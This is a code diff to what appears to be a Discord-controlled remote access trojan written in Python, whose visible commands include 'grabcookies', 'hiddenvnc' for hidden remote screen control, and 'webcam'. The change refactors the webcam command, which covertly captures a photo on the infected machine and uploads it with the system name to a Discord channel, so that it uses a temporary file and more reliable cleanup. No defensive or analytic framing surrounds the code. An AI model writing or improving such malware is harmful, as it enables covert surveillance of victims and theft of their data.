@@ -1718,7 +1718,6 @@ async def grabcookies(ctx):
 @bot.command(name='webcam', help='Takes a photo using the webcam')
 async def take_webcam_photo(ctx):
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    webcam_path = f'webcam_{timestamp}.jpg'
     
     try:
         # Initialize webcam
@@ -1736,22 +1735,24 @@ async def take_webcam_photo(ctx):
             cap.release()
             return
         
-        # Save the image
-        cv2.imwrite(webcam_path, frame)
-        
         # Release the webcam
         cap.release()
         
-        # Send the image
-        await ctx.send(f'📸 Webcam photo from {SYSTEM_NAME} taken at {timestamp}', file=discord.File(webcam_path))
+        # Create a temporary file
+        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
+            temp_path = temp_file.name
+            # Save the image to the temporary file
+            cv2.imwrite(temp_path, frame)
         
-        # Clean up the file after sending
-        os.remove(webcam_path)
+        # Send the image
+        await ctx.send(f'📸 Webcam photo from {SYSTEM_NAME} taken at {timestamp}', file=discord.File(temp_path))
+        
     except Exception as e:
         await ctx.send(f'❌ Error taking webcam photo: {str(e)}')
-        # Clean up the file even if sending fails
-        if os.path.exists(webcam_path):
-            os.remove(webcam_path)
+    finally:
+        # Clean up the temporary file if it exists
+        if 'temp_path' in locals() and os.path.exists(temp_path):
+            os.remove(temp_path)
 
 @bot.command(name='hiddenvnc', help='Interactive remote screen control for Windows')
 async def hiddenvnc_command(ctx, action="start", interval="0.5"):
